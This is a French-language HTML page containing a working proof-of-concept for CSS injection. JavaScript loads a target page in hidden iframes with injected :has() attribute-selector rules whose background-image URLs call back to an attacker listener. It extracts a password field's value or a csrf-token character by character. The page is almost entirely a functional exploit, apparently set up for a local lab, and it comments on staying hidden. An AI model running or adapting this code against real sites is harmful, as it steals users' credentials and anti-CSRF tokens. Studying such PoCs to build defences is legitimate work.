<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Les injections CSS - Attribute Selector</title>
        <style>
            #current {
                font-size: 32px;
                color: red;
            }

            #time_to_next {
                font-size: 24px;
                color: black;
            }

            #frames {
                visibility: hidden;
            }
        </style>
    </head>
    <body>
        <h1>Récupération de la valeur d'un attribut d'un élément HTML via la pseudo-class CSS has()</h1>

        <h2>PoC #1 - Champ de type password</h2>
        <form method="GET" action="">
            <button type="submit" name="action" value="start_password">Démarrer l'attaque</button>
        </form>

        <h2>PoC #2 - Champ de type hidden</h2>
        <form method="GET" action="">
            <button type="submit" name="action" value="start_hidden">Démarrer l'attaque</button>
        </form>

        <div id="current"></div>
        <div id="time_to_next"></div>
        <div id="frames"></div>

        <script>
            /* ==== CONFIG ==== */
            const RHOST = "http://127.0.0.1"
            const RURL = "/index.php?color=";  
            const LHOST = "http://127.0.0.1:81"
            const LURL_KNOWNCHARS = "/knownChars.php";
            const LURL_LEAKCHAR = "/leak.php?char=";
            const HTML_ELEMENT_NAME = "input";
            const HTML_ATTRIBUTE_NAME = "name";
            const PREFIX = "red;}";
            /********************/

            // Separate chars because of 414 URI too long
            const CHARS_1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
            const CHARS_2 = "abcdefghijklmnopqrstuvwxyz".split("");
            const CHARS_3 = "0123456789".split("");
            const CHARS_4 = "_-".split("");
            CHARS = new Array();
            CHARS[0] = CHARS_1;
            CHARS[1] = CHARS_2;
            CHARS[2] = CHARS_3;
            CHARS[3] = CHARS_4;

            known = "";
            target_time = new Date();
            timer = 0;

            function test_char(type) {
                // Remove all the frames
                document.getElementById("frames").innerHTML = "";
                
                for(i = 0 ; i < CHARS.length ; i++) {
                    // Append the chars with the known chars
                    css = build_css(type, CHARS[i].map(v => known + v));

                    // Create an iframe to try the attack
                    frame = document.createElement("iframe");
                    frame.src = RHOST + RURL + PREFIX + css;
                    frame.style="visibility: hidden;"; //gotta be sneaky sneaky like
                    document.getElementById("frames").appendChild(frame);

                    clearInterval(timer);
                    target_time = new Date();
                    target_time.setSeconds(target_time.getSeconds() + 1);
                    timer = setInterval(function() {
                        var current_time = new Date();
                        diff = target_time - current_time;
                        document.getElementById("time_to_next").innerHTML = "Time to next reload: " + diff / 1000;
                    }, 50);
                }

                // in 1 seconds, after the iframe loads, check to see if we got a response yet
                setTimeout(function() {
                    var oReq = new XMLHttpRequest();
                    oReq.addEventListener("load", function known_listener() {
                        document.getElementById("current").innerHTML = "Current retrieved data: " + this.responseText;
                        if(known != this.responseText) {
                            known = this.responseText;
                            test_char(type);
                        } else {
                            known = this.responseText;
                            alert("Retrieved data is: " + known);
                        }
                    });
                    oReq.open("GET", LHOST + LURL_KNOWNCHARS);
                    oReq.send();
                }, 1000);
            }

            function build_css(type, values) {
                css_payload = "";
                const isHiddenTypeElement = type;

                for(var value in values) {  
                    if(isHiddenTypeElement) {
                        HTML_ATTRIBUTE_VALUE = "csrf-token";
                        css_payload += "form:has(" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^="
                        + values[value]
                        + "]){background-image:url(" + LHOST + LURL_LEAKCHAR 
                        + values[value]
                        + ")%3B}";
                    }
                    else {
                        HTML_ATTRIBUTE_VALUE = "password";
                        css_payload += "form:has(" + HTML_ELEMENT_NAME + "[" + HTML_ATTRIBUTE_NAME + "=" + HTML_ATTRIBUTE_VALUE + "][value^="
                        + values[value]
                        + "]){background-image:url(" + LHOST + LURL_LEAKCHAR 
                        + values[value]
                        + ")%3B}";
                    }
                }
                return css_payload;
            }            

            document.addEventListener('DOMContentLoaded', function () {
                const params = new URLSearchParams(window.location.search);
                const action = params.get('action');

                if (action === 'start_password') {
                    test_char(false);
                }

                if (action === 'start_hidden') {
                    test_char(true);
                }
            });
        </script>
    </body>
</html>